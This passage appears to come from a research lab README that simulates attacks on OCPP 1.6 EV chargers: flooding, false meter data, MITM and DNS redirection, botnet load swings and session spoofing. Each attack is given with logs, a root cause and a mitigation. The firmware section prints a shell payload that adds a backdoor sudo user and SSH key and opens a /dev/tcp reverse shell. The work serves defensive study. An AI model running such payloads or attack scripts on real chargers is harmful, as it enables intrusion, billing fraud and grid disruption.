[OK  14:02:31.462] CSMS accepted rogue BootNotification — shadow session active
[ATK 14:02:31.463] Starting Heartbeat flood (interval=1.0 ms)
[ATK 14:02:31.463] Legitimate EVSE MeterValues should now stop appearing in CSMS output

[ATK 14:02:36.471] Flood stats — sent: 4,921  errors: 0  rate: 984 HB/s  elapsed: 5.0s
[ATK 14:02:41.479] Flood stats — sent: 9,887  errors: 0  rate: 989 HB/s  elapsed: 10.1s
```

**Expected output — CSMS terminal (key evidence: duplicate CP_1 connections accepted):**
```
[CSMS] Connected: CP_1
[CSMS] BootNotification from: CP_1 (LegitVendor / EVSE-v2.0)
[CSMS] CP_1 | Power = 60.0 kW
[CSMS] Connected: CP_1                       ← second connection accepted, no dedup
[CSMS] BootNotification from: CP_1 (RogueVendor / RogueCP-v1.0)
[CSMS] CP_1 | Power = 60.0 kW               ← legitimate EVSE still printing (session shadowing)
```

**Root cause:** No CP authentication; no connection registry in OCPP 1.6.  
**Mitigation:** OCPP 2.0.1 with mutual TLS; CSMS-side duplicate-session rejection.

---

### Attack 2 — False Data Injection (FDI)

**Script:** `attacks/attack_fdi.py`  
**Profile:** `fdi`  
**Network:** operator-net (insider / compromised EVSE)

A compromised EVSE fabricates MeterValues readings. The CSMS trusts all reported values unconditionally — no signing or plausibility check exists.

| Phase | Real draw | Reported to CSMS | Effect |
|-------|-----------|------------------|--------|
| 1 — Normal | 60 kW | 60 kW | Baseline |
| 2 — Under-report | 60 kW | 0 kW | Grid load hidden; billing zeroed |
| 3 — Over-report | 0 kW | 999 kW | Phantom demand event triggered |

```bash
python attacks/attack_fdi.py
CSMS_URL=ws://127.0.0.1:9000 python attacks/attack_fdi.py
```

**Expected output — attack terminal:**
```
Connecting to CSMS at ws://127.0.0.1:9000 as 'CP_1' ...
[14:05:10] Registered with CSMS — status: accepted

PHASE 1 — NORMAL REPORTING (15s)
[14:05:10] NORMAL  | real=  60.0 kW | reported=  60.0 kW | ✓
[14:05:12] NORMAL  | real=   0.0 kW | reported=   0.0 kW | ✓
[14:05:14] NORMAL  | real=  60.0 kW | reported=  60.0 kW | ✓

PHASE 2 — UNDER-REPORTING (15s)
Charger draws 60.0 kW. Reporting 0.0 kW to CSMS.
[14:05:25] UNDER   | real=  60.0 kW | reported=   0.0 kW | HIDING 60 kW from operator
[14:05:27] UNDER   | real=  60.0 kW | reported=   0.0 kW | HIDING 60 kW from operator

PHASE 3 — OVER-REPORTING (15s)
Charger is idle. Reporting 999.0 kW to CSMS.
[14:05:40] OVER    | real=   0.0 kW | reported= 999.0 kW | FAKING 999 kW phantom load
[14:05:42] OVER    | real=   0.0 kW | reported= 999.0 kW | FAKING 999 kW phantom load
```

**Expected output — CSMS terminal (key evidence: gap between attack and CSMS values):**
```
[CSMS] Connected: CP_1
[CSMS] BootNotification from: CP_1 (Compromised-Vendor / FDI-Demo-v1)
[CSMS] CP_1 | Power = 60.0 kW     ← Phase 1: matches attack terminal (accurate)
[CSMS] CP_1 | Power = 0.0 kW
[CSMS] CP_1 | Power = 0.0 kW      ← Phase 2: CSMS sees 0 while charger draws 60 kW
[CSMS] CP_1 | Power = 0.0 kW
[CSMS] CP_1 | Power = 999.0 kW    ← Phase 3: CSMS sees 999 kW on idle charger
[CSMS] CP_1 | Power = 999.0 kW
```

**Root cause:** MeterValues are unsigned and unverified in OCPP 1.6.  
**Mitigation:** OCPP 2.0.1 signed MeterValues; CSMS plausibility checks; cross-reference with SCADA.

---

### Attack 3a — MITM WebSocket Proxy (Internal)

**Script:** `attacks/attack_mitm_session_patched.py`  
**Profile:** `mitm`  
**Network:** operator-net (172.19.0.40)  
**Initial access:** ARP poisoning / rogue switch on charging site LAN

An attacker already on the operator LAN intercepts the plaintext OCPP channel between the EVSE and CSMS.

| Phase | Duration | Action |
|-------|----------|--------|
| 1 — Transparent relay | 0–10 s | All traffic forwarded and logged, nothing modified |
| 2 — MeterValues tampering | 10–20 s | Real kW values replaced with 999 kW before reaching CSMS |
| 3 — StopTransaction injection | 20 s+ | Forged `StopTransaction` sent to CSMS; session closed while EVSE keeps charging; billing corrupted |

```bash
python attacks/attack_mitm_session_patched.py --csms-url ws://127.0.0.1:9000
python attacks/attack_mitm_session_patched.py --tamper-delay 5 --inject-delay 15
python core/evse_client4_fixed.py --url ws://127.0.0.1:9001
```

**Expected output — proxy terminal:**
```
  Proxy listening on  : ws://0.0.0.0:9001
  Forwarding to CSMS  : ws://127.0.0.1:9000
  Tamper phase starts : T+10s after EVSE connects
  Injection at        : T+20s after EVSE connects
  Tampered power value: 999.0 kW

[PRX 14:10:01.200] EVSE connected to proxy — opening upstream connection to CSMS
[PRX 14:10:01.215] CP identity captured: 'CP_1' — relaying to CSMS
[ATK 14:10:01.216] MITM SESSION ACTIVE for CP: 'CP_1'
[E→C 14:10:01.220] [BootNotification] uid=a1b2c3d4 → forwarding
[E→C 14:10:03.401] [MeterValues] uid=e5f6g7h8 → forwarding       ← Phase 1: transparent

[TAM 14:10:11.220] PHASE 2 ACTIVE — MeterValues TAMPERING
[TAM 14:10:11.224] TAMPERED #1: real=34.52 kW → csms sees=999.0 kW
[TAM 14:10:13.401] TAMPERED #2: real=41.18 kW → csms sees=999.0 kW

[ATK 14:10:21.220] PHASE 3 — INJECTING FORGED StopTransaction
[ATK 14:10:21.220]   uid       : mitm-stop-1718812221
[ATK 14:10:21.220]   meterStop : 0 Wh  (billing corrupted)
[ATK 14:10:21.220]   reason    : Remote
[ATK 14:10:21.220] EVSE keeps charging. CSMS closes session.
[ATK 14:10:21.235] StopTransaction frame delivered to CSMS
```

**Expected output — CSMS terminal (key evidence: session closed while EVSE never stopped):**
```
[CSMS] Connected: CP_1
[CSMS] BootNotification from: CP_1 (EV-Vendor / EVSE-2.0)
[CSMS] CP_1 | Power = 34.52 kW    ← Phase 1: real values pass through
[CSMS] CP_1 | Power = 999.0 kW    ← Phase 2: tampered — real value was ~41 kW
[CSMS] CP_1 | Power = 999.0 kW

[CSMS] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[CSMS]  STOPTRANSACTION received from : CP_1
[CSMS]  transaction_id : 1
[CSMS]  meter_stop     : 0 Wh
[CSMS]  --> SESSION TERMINATED — billing closed at 0 Wh   ← injected, EVSE still charging
[CSMS] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

**Root cause:** Plaintext WebSocket (ws://); no message integrity.  
**Mitigation:** TLS (wss://); mutual TLS certificate authentication; OCPP 2.0.1 per-message signing.

---

### Attack 3b — MITM WebSocket Proxy (External)

**Script:** `attacks/attack_mitm_ext.py`  
**Profile:** `mitm-ext`  
**Network:** public-net (172.20.0.30) — **zero operator-net access**  
**Initial access:** BGP hijacking / DNS poisoning / rogue cloud reverse proxy

An attacker on the WAN path intercepts EVSE traffic destined for a cloud-hosted CSMS. No physical presence at the charging site is required. The attack exploits the fact that OCPP 1.6 uses plaintext `ws://` on the public internet, providing no protection against WAN-level interception.

Same three-phase attack capability as 3a (transparent relay → MeterValues tampering → StopTransaction injection), but achieved entirely from the public network:

```bash
python attacks/attack_mitm_ext.py --csms-url ws://127.0.0.1:9000
python attacks/attack_mitm_ext.py --tamper-delay 5 --inject-delay 15
python core/evse_client4_fixed.py --url ws://127.0.0.1:9002
```

**Expected output** is identical in structure to Attack 3a above, with the proxy listening on port 9002 instead of 9001. The key distinction visible in logs and pcap is the source IP: the proxy originates from `172.20.0.30` (public-net), not from the operator LAN.

**Key distinction from 3a:** The attacker is on `public-net` only. This models real-world scenarios where EVSEs connect to cloud CSMS platforms over 4G/LTE, and the attacker intercepts the WAN path rather than the local LAN.

**Root cause:** No TLS on the WAN path; no certificate pinning; EVSE cannot distinguish real CSMS from a proxy.  
**Mitigation:** WSS + certificate pinning; mutual TLS; DNS-over-TLS / DNSSEC; OCPP 2.0.1 signed messages.

---

### Attack 3b-DNS — External MITM with a real interception primitive

**Scripts:** `attacks/dns_poison.py` + `attacks/attack_mitm_ext.py`  
**Profiles:** `mitm-ext-dns` (attack) · `mitm-ext-dns-safe` (benign control)  
**Network:** public-net — **zero operator-net access**  
**Initial access:** attacker controls the EVSE's DNS resolution (rogue 4G-SIM DNS, compromised site gateway, DoT/DoH downgrade)

The plain `mitm-ext` profile above has a known weakness: the EVSE is launched with `--url ws://atk-mitm-ext:9002`, i.e. it is *told* to dial the attacker. That assumes the interception rather than demonstrating it. This variant supplies the missing **interception primitive**.

Here the EVSE is configured with the **real CSMS hostname** (`ws://csms.cpo.sg:9000`) and resolves it through a DNS server the attacker controls. In `POISON` mode that resolver returns the attacker's IP (`172.20.0.33`); the EVSE dials the MITM proxy believing it reached the cloud CSMS. The interception is now caused by **name resolution**, not by the victim's own configuration.

**Where the attack actually comes from — step by step**

The external attack originates **on the public internet, by subverting the charger's name resolution** — not from the operator's network, and not from the charger's own configuration.

- **Stage 0 — Attacker position.** The attacker is on the public internet only: no presence at the charging site, no foothold on the operator LAN (`operator-net` is unreachable). This is the genuinely *external* tier.
- **Stage 1 — Gaining control of the charger's DNS (the origin).** Singapore public chargers reach a cloud CSMS over a 4G/LTE SIM or public broadband, resolving a hostname such as `csms.cpo.sg`. The attacker subverts that lookup by one of: a rogue/compromised carrier or MVNO DNS handed to the EVSE via its 4G APN; cache-poisoning the recursive resolver the EVSE uses; a rogue cellular base station / on-path DNS spoofing on the radio link; compromising the site gateway/CPE that serves DNS to the charger; or stripping a DoT/DoH upgrade so plaintext DNS can be forged. **This is the one step EVSecSim *assumes*** (modelled by the attacker-controlled `dns-poison` resolver) rather than exploits — the honest boundary of the claim. Everything after this is demonstrated.
- **Stage 2 — Redirection.** The EVSE asks for `csms.cpo.sg`; the attacker's resolver answers with the attacker's IP (forged A-record). The EVSE opens its OCPP WebSocket to the attacker while still addressing the real hostname.
- **Stage 3 — Interposition.** The attacker accepts the connection and opens its own onward connection to the real CSMS, relaying frames transparently. Because OCPP 1.6 is plaintext `ws://` with no server-certificate or identity check, the EVSE cannot tell the proxy from the CSMS.
- **Stage 4 — Manipulation.** Now in-path, the attacker rewrites and injects OCPP messages (see *Actual impact* below).

**The rigour win — the EVSE config is byte-identical across both runs:**

```
attack run  (mitm-ext-dns):       --url ws://csms.cpo.sg:9000     # DNS lies → attacker
benign run  (mitm-ext-dns-safe):  --url ws://csms.cpo.sg:9000     # DNS honest → real CSMS
```

Only the DNS answer differs. The charger is never reconfigured — proving the attack lives entirely in the network's name lookup.

```bash
# Attack: poisoned DNS redirects the EVSE through the MITM proxy
docker compose --profile mitm-ext-dns up --build --force-recreate

# Benign control: same EVSE command, honest DNS, reaches the real CSMS
docker compose --profile mitm-ext-dns-safe up --build --force-recreate
```

**Verified end-to-end (June 2026):**

| Evidence | Attack run (`mitm-ext-dns`) | Benign run (`mitm-ext-dns-safe`) |
|---|---|---|
| DNS answer for `csms.cpo.sg` | `FORGED ... A -> 172.20.0.33` (attacker) | `honest ... A -> 172.20.0.10` (real CSMS) |
| EVSE believes it connected to | `csms.cpo.sg` (real hostname) | `csms.cpo.sg` (real hostname) |
| What the CSMS records | `999.0 kW` (tampered in transit) | `60.0 kW` (untampered) |
| StopTransaction | forged injection from public-net | none |

**Evidence chain (reviewer-proof):** (1) the EVSE issues a DNS query for `csms.cpo.sg`; (2) the resolver returns a forged A-record pointing at the attacker; (3) the EVSE opens its WebSocket to the attacker IP while still believing the host is `csms.cpo.sg`; (4) the proxy relays on to the real CSMS while tampering. All four are visible in `dns-poison`, `evse-via-dns`, and `atk-mitm-ext-dns` container logs (and a port-53 / port-9000 pcap).

**Actual impact of the attack**

The MITM sits on the EVSE→CSMS *reporting* path, so the impact is on the **integrity of what the operator believes**, not on the physics of the charger — the EV charges exactly as it would otherwise. Two effects, both demonstrated in the run:

| In-path action | What the CSMS / operator sees | Real-world impact |
|---|---|---|
| MeterValues tampered `60 → 999 kW` | Inflated power/energy for the session | Corrupted billing (over- or under-charge); and where this telemetry feeds a grid model / state estimator (e.g. PGTwin), a **phantom load** that skews the operator's situational picture and any automated decision built on it |
| Forged `StopTransaction` injected | Session "ended" while the EV keeps charging | Billing closed early → **unmetered / free energy** and revenue loss; session-state desync; the operator's books and grid view diverge from physical reality |

The decisive point: because OCPP 1.6 has **no message authentication**, none of this is visible to the operator from the OCPP stream — the frames are syntactically valid and arrive over an apparently normal session. Reliable detection requires an **external cross-check** (smart meter / AMI, grid SCADA) or, better, preventing the interposition outright (DNSSEC / cert-pinning / mutual-TLS). This is a *data-integrity* attack on the channel, consequential precisely because the CSMS — and the digital twin behind it — trust the channel.

**Honest scoping:** this does not remove the trust assumption — it **relocates** it from the indefensible *"the victim's config points at the attacker"* to the defensible *"the attacker controls the EVSE's name resolution."* The poisoning act itself (gaining control of the resolver) is assumed, matching the documented 4G-DNS / gateway-compromise vectors; everything downstream is demonstrated.

**Where this sits — external MITM is a 2×2 (interception × transport):**

| | **ws://** (Profile 1) | **wss:// no pinning** | **wss:// pinned / mutual-TLS** |
|---|---|---|---|
| **DNS redirect** | ✅ full MITM — **this profile** | ⚠️ needs a cert-trust failure (rogue cert / downgrade) | ❌ blocked |
| **BGP hijack** | ✅ (future work) | ⚠️ | ❌ blocked — see `v201/secure` |

The plaintext-`ws://` corner is now demonstrated end-to-end; the mutual-TLS corner is the `v201/secure` prevention track. This frames the interception primitive (the rigour fix) separately from transport security (the related strengthening), and unifies the external-MITM story with the OCPP 2.0.1 work.

**Root cause:** EVSE trusts unauthenticated DNS and an unauthenticated `ws://` endpoint; it cannot bind the hostname to the real CSMS identity.  
**Mitigation:** DNS-over-TLS / DNSSEC (stops the forged record); WSS + certificate pinning or mutual-TLS (the connection fails even if DNS is poisoned, because the attacker holds no valid CSMS certificate — demonstrated in `v201/secure`).

---

### Attack 4 — Coordinated Load Altering

**Script:** `attacks/attack_load_altering.py`  
**Profile:** `load`  
**Network:** public-net (external botnet)

A botnet of compromised EVSEs connects to the CSMS and executes coordinated load commands. A pandapower grid twin (220 kV → 66 kV → 22 kV; 500 EV chargers; 1,510 MW total load) runs a power flow after each phase and reports real grid impact metrics.

| Phase | Action | Grid effect |
|-------|--------|-------------|
| Baseline | All bots at 220 kW | Normal operation |
| Surge | All bots simultaneously max load | Voltage sag; transformer overload |
| Drop | All bots simultaneously drop to zero | Voltage rise; unnecessary generation dispatch |
| Oscillate | Bots toggle 0 ↔ 220 kW every 5 s | Protection relay misoperation risk |

```bash
python attacks/attack_load_altering.py --bots 10
python attacks/attack_load_altering.py --bots 50    # 10% of 500-station fleet
python attacks/attack_load_altering.py --bots 500   # full fleet takeover
```

**Expected output — attack terminal (10-bot run):**
```
  CSMS            : ws://127.0.0.1:9000
  Bot fleet size  : 10 chargers
  Fleet coverage  : 2% of 500-station grid twin
  Simulated load  : 2.2 MW botnet / 110 MW total EV

[GRD 14:15:03] Building pandapower grid twin (a6breakers topology)...
[GRD 14:15:05] Grid twin ready: 500 EV chargers, 1510 MW total load

[BOT 14:15:05] Connecting 10 bots to CSMS...
  Connected: 10/10
[OK  14:15:06] 10 bots connected and registered with CSMS

  [14:15:06] Tick  1 — all bots → 220.0 kW (normal)

[GRD 14:15:26] Power flow result — Baseline (all normal)
[GRD 14:15:26]   EV load        :   110.0 MW  (nominal: 110 MW)
[GRD 14:15:26]   22kV vm_pu     :  0.9456 pu  (RISE ▲ from nominal 0.9456)
[GRD 14:15:26]   Trafo loading  :  22.0%
[GRD 14:15:26]   Est. Δf        : +0.0000 Hz

  [14:15:26] Tick  1 — SURGE all 10 bots → 220.0 kW  [coordinated max load]

[GRD 14:15:46] Power flow result — Coordinated surge (all max)
[GRD 14:15:46]   22kV vm_pu     :  0.9408 pu  (SAG ▼ from nominal 0.9456)
[GRD 14:15:46]   Trafo loading  :  22.0%

  [14:15:46] Tick  1 — DROP  all 10 bots →   0.0 kW  [coordinated zero load]

[GRD 14:16:06] Power flow result — Coordinated drop (all zero)
[GRD 14:16:06]   22kV vm_pu     :  0.9462 pu  (RISE ▲ from nominal 0.9456)
[GRD 14:16:06]   Est. Δf        : -0.0001 Hz

  [14:16:06] Tick  1 — MAX ▲  all 10 bots → 220.0 kW
  [14:16:11] Tick  2 — ZERO ▼ all 10 bots →   0.0 kW

  Mode                                  EV MW    22kV pu    Trafo %
  --------------------------------- -------- ---------- ----------
  Baseline (all normal)               110.0     0.9456      22.0%    OK
  Coordinated surge (all max)         110.0     0.9408      22.0%  ▼ SAG
  Coordinated drop (all zero)         107.8     0.9462      21.6%  ▲ RISE
  Oscillating (mid-cycle)             110.0     0.9456      22.0%    OK
```

**Expected output — CSMS terminal (10 bots registering, then load flood):**
```
[CSMS] Connected: BOT_001
[CSMS] BootNotification from: BOT_001 (BotFleet-Vendor / BotCP-220kW)
[CSMS] Connected: BOT_002
...
[CSMS] Connected: BOT_010
[CSMS] BOT_001 | Power = 220.0 kW
[CSMS] BOT_002 | Power = 220.0 kW
[CSMS] BOT_003 | Power = 220.0 kW       ← coordinated surge: all bots simultaneously
...
[CSMS] BOT_001 | Power = 0.0 kW
[CSMS] BOT_002 | Power = 0.0 kW         ← coordinated drop: all bots simultaneously
```

**Root cause:** No per-CP rate limiting; no operator-signed charging profiles.  
**Mitigation:** OCPP 2.0.1 `SetChargingProfile` with signed profiles; CSMS anomaly detection; grid-side ROCOL protection relays.

---

### Attack 5 — Malicious Firmware Update / Remote Code Execution

**Script:** `attacks/attack_firmware.py`  
**Profile:** `firmware`  
**Network:** operator-net (172.19.0.30)  
**Based on:** INL/CON-23-72329 PoC #3

OCPP 1.6 `UpdateFirmware` carries a plain HTTP/FTP URL and a scheduled retrieval time. There is no firmware signature field, no certificate, and no integrity hash. The EVSE trusts the URL unconditionally and installs whatever is served.

This script acts as a **rogue CSMS** and simultaneously runs an embedded HTTP server serving a malicious shell script payload. No real CSMS is started in the `firmware` profile — `atk-firmware` replaces it entirely.

| Phase | Description |
|-------|-------------|
| 1 — Normal operation (0–10 s) | EVSE connects, boots, sends MeterValues normally. No OCPP mechanism exists to verify CSMS identity. |
| 2 — Firmware push (t = 10 s) | Rogue CSMS sends `UpdateFirmware` pointing at `http://atk-firmware:8080/firmware.sh`. |
| 3 — Payload execution | EVSE downloads the script, prints its full contents, walks through `Downloading → Downloaded → Installing → Installed` with no integrity check at any step. |

**Payload delivered to EVSE (`firmware.sh`):**
```sh
useradd -m -s /bin/bash backdoor
echo 'backdoor:EV$ecr3t!' | chpasswd
usermod -aG sudo backdoor
echo '<attacker_pubkey>' >> /root/.ssh/authorized_keys
nohup bash -i >& /dev/tcp/172.19.0.30/4444 0>&1 &
```

```bash
python attacks/attack_firmware.py
python attacks/attack_firmware.py --push-delay 5
python attacks/attack_firmware.py --firmware-host atk-firmware --push-delay 10
```

**Expected output — rogue CSMS terminal:**
```
  Rogue CSMS    : ws://0.0.0.0:9000
  Payload URL   : http://127.0.0.1:8080/firmware.sh
  Push delay    : 10s after EVSE boot

[14:20:01] [HTTP-PAYLOAD] Serving malicious firmware at http://0.0.0.0:8080/firmware.sh
[14:20:01] [ROGUE-CSMS] Listening on ws://0.0.0.0:9000

[14:20:05] [ROGUE-CSMS] EVSE connected: CP_1
[14:20:05] [ROGUE-CSMS] BootNotification from CP_1 (EV-Vendor / EVSE-2.0)
[14:20:05] [ROGUE-CSMS] Accepted — EVSE cannot distinguish this from the real CSMS
[14:20:05] [ROGUE-CSMS] Waiting 10s before pushing malicious firmware ...
[14:20:07] [ROGUE-CSMS] MeterValues from CP_1: 34.5 kW

[14:20:15] [ROGUE-CSMS] === PHASE 2 — FIRMWARE PUSH ===
[14:20:15] [ROGUE-CSMS] Sending UpdateFirmware to EVSE
[14:20:15] [ROGUE-CSMS]   location     : http://127.0.0.1:8080/firmware.sh
[14:20:15] [ROGUE-CSMS]   retrieve_date: 2024-06-19T14:20:16+00:00
[14:20:15] [ROGUE-CSMS] OCPP 1.6 carries no firmware signature

[14:20:16] [HTTP-PAYLOAD] Malicious firmware delivered to 127.0.0.1

[14:20:16] [ROGUE-CSMS] FirmwareStatusNotification: downloading
[14:20:17] [ROGUE-CSMS] FirmwareStatusNotification: downloaded
[14:20:17] [ROGUE-CSMS] EVSE downloaded payload — zero integrity checks performed
[14:20:18] [ROGUE-CSMS] FirmwareStatusNotification: installing
[14:20:18] [ROGUE-CSMS] EVSE is executing payload — backdoor being installed
[14:20:19] [ROGUE-CSMS] FirmwareStatusNotification: installed

[14:20:19] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[14:20:19]   PAYLOAD INSTALLED — EVSE FULLY COMPROMISED
[14:20:19]   Backdoor user 'backdoor' created (sudo)
[14:20:19]   SSH key implanted in /root/.ssh/authorized_keys
[14:20:19]   Reverse shell: 172.19.0.30:4444
[14:20:19] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

**Root cause:** `UpdateFirmware` in OCPP 1.6 has no signature field; EVSE has no way to verify CSMS identity (no mutual TLS).  
**Mitigation:** OCPP 2.0.1 `SignedUpdateFirmware` with X.509 certificate chain; mutual TLS on CSMS WebSocket; EVSE-side firmware hash and signature verification before installation.

---

### Attack 6 — Duration Spoofing (StopTransaction Suppression)

**Script:** `attacks/attack_duration_spoof.py`  
**Profile:** `duration-spoof`  
**Network:** operator-net (172.19.0.41)  
**Initial access:** ARP poisoning / rogue switch on charging site LAN

OCPP 1.6 gives the CSMS no independent mechanism to detect when an EV physically disconnects — it relies entirely on the EVSE sending `StopTransaction`. A MITM proxy can intercept and suppress this message, sustaining a phantom charging session on the CSMS after the real EV has left.

This is the **opposite** of premature session termination (Attack 3a). Rather than forging an early stop, it prevents the legitimate stop from being acknowledged by the real CSMS, keeping the session open indefinitely.

| Phase | Duration | Action |
|-------|----------|--------|
| 1 — Transparent relay | 0 s → real disconnect | `BootNotification`, `StartTransaction`, and `MeterValues` forwarded normally. Proxy captures `transactionId` from the `StartTransaction` ACK. |
| 2 — StopTransaction DROP | At real disconnect | EVSE sends `StopTransaction`. Proxy intercepts it, sends a **forged ACK** back to the EVSE so it disconnects cleanly. The message is **not forwarded** to the CSMS — the CSMS never learns the session ended. |
| 3 — Ghost session | 50 s (configurable) | Proxy injects synthetic `MeterValues` at 60 kW every 10 s, sustaining the phantom session. After the ghost window, a final `StopTransaction` is sent to clean up CSMS state. |

**PGTwin impact:** The CSMS reports an active 60 kW load on a physically idle charger. If the CSMS feeds load data to the PGTwin grid twin at each `MeterValues` interval, the simulation accumulates non-existent grid demand. With the default 50 s ghost window, **0.83 kWh of phantom energy** is injected per spoofed session. The error grows linearly with ghost duration and number of targeted chargers.

**Evidence in the pcap (capture container: `atk-duration-spoof`, filter: `port 9003 or port 9000`):**
- `StopTransaction` appears on port 9003 (EVSE→proxy) — **absent on port 9000** (proxy→CSMS)
- Forged ACK appears on port 9003 (proxy→EVSE) at the same instant
- Phantom `MeterValues` appear on port 9000 only, after port 9003 goes silent

```bash
# Run the proxy (Terminal 1 after starting CSMS)
python attacks/attack_duration_spoof.py --csms-url ws://127.0.0.1:9000

# Run EVSE with a timed session so it sends StopTransaction (Terminal 2)
python core/evse_client4_fixed.py --url ws://127.0.0.1:9003 --session-duration 20

# Longer ghost phase for PGTwin integration demo
python attacks/attack_duration_spoof.py --ghost-duration 120 --meter-interval 5
```

**Expected output — proxy terminal:**
```
  Proxy listening on : ws://0.0.0.0:9003
  Forwarding to CSMS : ws://127.0.0.1:9000
  Ghost duration     : 60s after real disconnect
  Meter interval     : 10s (synthetic MeterValues)

[PRX 14:25:01.100] EVSE connected — opening upstream CSMS connection
[PRX 14:25:01.117] CP identity: 'CP_1' → relaying to CSMS
[ATK 14:25:01.118] DURATION SPOOF PROXY ACTIVE — CP: 'CP_1'
[ATK 14:25:01.118] Waiting for StopTransaction to intercept...

[E→C 14:25:01.122] [BootNotification] uid=a1b2c3d4 → forwarding
[C→E 14:25:01.137] [StartTransaction ACK] transactionId=1 captured
[E→C 14:25:03.210] [MeterValues] uid=b3c4d5e6 → forwarding       ← Phase 1: transparent

[ATK 14:25:21.500] PHASE 2 — StopTransaction INTERCEPTED AND DROPPED
[ATK 14:25:21.500]   EVSE 'CP_1' → NOT forwarded to CSMS
[ATK 14:25:21.500]   transactionId : 1
[ATK 14:25:21.500]   meterStop     : 180000 Wh  (real final reading)
[ATK 14:25:21.500]   Forging ACK → EVSE disconnects cleanly, CSMS never learns
[ATK 14:25:21.512] Forged StopTransaction ACK sent to EVSE

[GHO 14:25:21.515] PHASE 3 — GHOST SESSION ACTIVE
[GHO 14:25:21.515]   EVSE 'CP_1' physically gone — CSMS sees active session
[GHO 14:25:21.515]   Ghost duration : 60s  (MeterValues every 10s)
[GHO 14:25:21.515]   Phantom power  : 60.0 kW = 0.1667 kWh/interval
[GHO 14:25:31.516] Phantom MeterValues #1: 180167 Wh  (+167 Wh phantom energy)
[GHO 14:25:41.517] Phantom MeterValues #2: 180334 Wh  (+167 Wh phantom energy)
[GHO 14:26:21.521] Phantom MeterValues #6: 181002 Wh  (+167 Wh phantom energy)

[GHO 14:26:21.522] Ghost ended — 0.1002 kWh phantom energy injected
[GHO 14:26:21.535] Final StopTransaction: meterStop=181002 Wh (includes phantom energy)
```

**Expected output — CSMS terminal (key evidence: 60 kW load persists after EVSE is gone):**
```
[CSMS] Connected: CP_1
[CSMS] CP_1 | StartTransaction: connectorId=1 idTag=EV001 meterStart=0 Wh → txId=1
[CSMS] CP_1 | Power = 34.52 kW    ← real EVSE charging
[CSMS] CP_1 | Power = 41.18 kW
[CSMS] CP_1 | Power = 60.0 kW     ← ghost session begins here (EVSE already disconnected)
[CSMS] CP_1 | Power = 60.0 kW
[CSMS] CP_1 | Power = 60.0 kW     ← phantom load reported for 60s after physical disconnect

[CSMS] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[CSMS]  STOPTRANSACTION received from : CP_1
[CSMS]  transaction_id : 1
[CSMS]  meter_stop     : 181002 Wh     ← inflated by ghost energy
[CSMS]  --> SESSION TERMINATED — billing closed at 181002 Wh
[CSMS] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

**Root cause:** `StopTransaction` is unsigned and unverified; CSMS has no independent disconnect detection; OCPP 1.6 has no session-liveness timeout tied to physical charger state.  
**Mitigation:** WSS + mutual TLS (prevents MITM interposition); CSMS Heartbeat inactivity timeout (Heartbeat stops when EVSE disconnects, eventually triggering a timeout); OCPP 2.0.1 signed `StopTransaction`; physical pilot-signal monitoring (CSMS cross-checks CP state against EVSE presence signal).

---

### Attack 7 — Single EVSE Grid Overload + PGTwin Introduction

**Script:** `attacks/attack_overload_grid.py`  
**Profile:** `overload-grid`  
**Network:** public-net (single rogue EVSE)  
**Grid:** Dr. Biswas's 7-substation Singapore distribution network (`grid/ZSGplussync_docker.py`)

The simplest possible PGTwin integration: a **single** rogue EVSE connects to the CSMS and sends MeterValues with progressively inflated power readings. OCPP 1.6 has no mechanism for the CSMS to verify reported kW against a charger's physical rating — any value is accepted unconditionally. Each load step is held long enough for the PGTwin power-flow results to stabilise, producing a clear, monotonic voltage sag at Bus 44 (Load4, DS4, 0.4 kV).

This attack is intentionally simpler than the botnet attacks that follow. Its role is pedagogical: prove the OCPP→grid coupling, establish the baseline vm_pu reference, and show that one rogue unit is sufficient to measurably stress a feeder.

**Coupling mechanism:**
```
[atk-overload-grid] ──writes──► /shared/ev_load_kw.txt ◄──reads── [pgtwin]
  (single EVSE, inflated kW)        (Docker volume)             (pandapower runpp)
```

| Step | Reported load | Bus 44 vm_pu | Actual voltage | Total load |
|------|--------------|-------------|----------------|------------|
| 0 — Baseline | 0 kW | **0.9689** | 387.6 V | 1290 kW |
| 1 — 9× over-report | 100 kW | **0.9418** | 376.7 V | 1390 kW |
| 2 — 18× over-report | 200 kW | **0.9093** | 363.7 V | 1490 kW |
| 3 — 27× over-report | 300 kW | **0.8694** | 347.8 V | 1590 kW |
| 4 — Cleanup | 0 kW | **0.9689** | 387.6 V | 1290 kW |

Key thresholds crossed: IEC 0.95 pu lower limit at ~72 kW (between steps 0 and 1); critical 0.90 pu protection threshold between steps 1 and 2; 300 kW drives Bus 44 to 0.87 pu — 13% below nominal, well into under-voltage relay territory.

```bash
docker compose --profile overload-grid up --build --force-recreate
```

**Expected output — pgtwin container (key evidence: monotonic vm_pu sag per step):**
```
[PGTwin] 7-substation grid simulator running. EV load injected at Load4 (Bus 44).
[PGTwin] iter=   1 | EV=    0.0 kW | Load4(Bus44) vm_pu=0.9689 | total_load=1290 kW  ← baseline (387.6 V)
...
[PGTwin] iter= 427 | EV=  100.0 kW | Load4(Bus44) vm_pu=0.9418 | total_load=1390 kW  ← step 1 (below IEC 0.95)
...
[PGTwin] iter= 884 | EV=  200.0 kW | Load4(Bus44) vm_pu=0.9093 | total_load=1490 kW  ← step 2 (relay risk)
...
[PGTwin] iter=1295 | EV=  300.0 kW | Load4(Bus44) vm_pu=0.8694 | total_load=1590 kW  ← step 3 (−13% nominal)
...
[PGTwin] iter=1700 | EV=    0.0 kW | Load4(Bus44) vm_pu=0.9689 | total_load=1290 kW  ← recovery
```

**Expected output — atk-overload-grid container:**
```
  CSMS           : ws://csms:9000
  Load steps     : [0.0, 100.0, 200.0, 300.0, 0.0] kW
  Step duration  : 20s  |  MV interval: 2s
  Grid target    : Load4 Bus 44 (DS4, 0.4 kV, small industry)

[OK  09:10:03] Registered with CSMS — no CP authentication required

  BASELINE — no EV load
[GRD 09:10:03] Step 0 |   0.0 kW → ev_load_kw.txt | tick  1

  OVERLOAD STEP 1 — 100 kW reported
